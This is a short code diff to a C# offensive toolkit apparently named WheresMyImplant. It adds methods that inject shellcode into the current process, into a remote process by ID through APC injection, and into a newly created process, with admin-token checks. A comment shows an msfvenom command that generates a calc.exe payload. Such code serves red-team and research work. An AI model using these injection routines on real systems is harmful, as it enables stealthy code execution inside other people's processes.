@@ -36,6 +36,48 @@ namespace WheresMyImplant
             }
         }
 
+        public static void InjectShellCodeManaged(String shellCodeString)
+        {
+            using (var iscm = new InjectShellCodeManaged(shellCodeString))
+            {
+                iscm.Execute();
+            }
+        }
+
+        //msfvenom -p windows/x64/exec --format csharp CMD=calc.exe
+        public static void InjectShellCodeAPC(String strProcessId, String strShellCode)
+        {
+            if (UInt32.TryParse(strProcessId, out UInt32 dwProcessId))
+            {
+                using (var isc = new InjectShellCodeRemoteAPC())
+                {
+                    if (MonkeyWorks.Unmanaged.Libraries.shell32.IsUserAnAdmin())
+                    {
+                        var tokens = new Tokens();
+                    }
+                    isc.OpenProcess(dwProcessId);
+                    isc.WriteShellCode(strShellCode);
+                    isc.CreateThread();
+                }
+            }
+            else
+            {
+                Console.WriteLine("Unknown Error");
+            }
+        }
+
+        public static void CreateAndInjectAPC(String strProcessId, String strShellCode)
+        {
+            using (var isc = new InjectShellCodeRemoteAPC())
+            {
+                if (MonkeyWorks.Unmanaged.Libraries.shell32.IsUserAnAdmin())
+                {
+                    new Tokens().Dispose();
+                }
+                isc.CreateProcessAndInject(strProcessId, strShellCode);
+            }
+        }
+
         public static void InjectShellCodeWMIFSB64(String processId, String wmiClass, String fileName)
         {
 
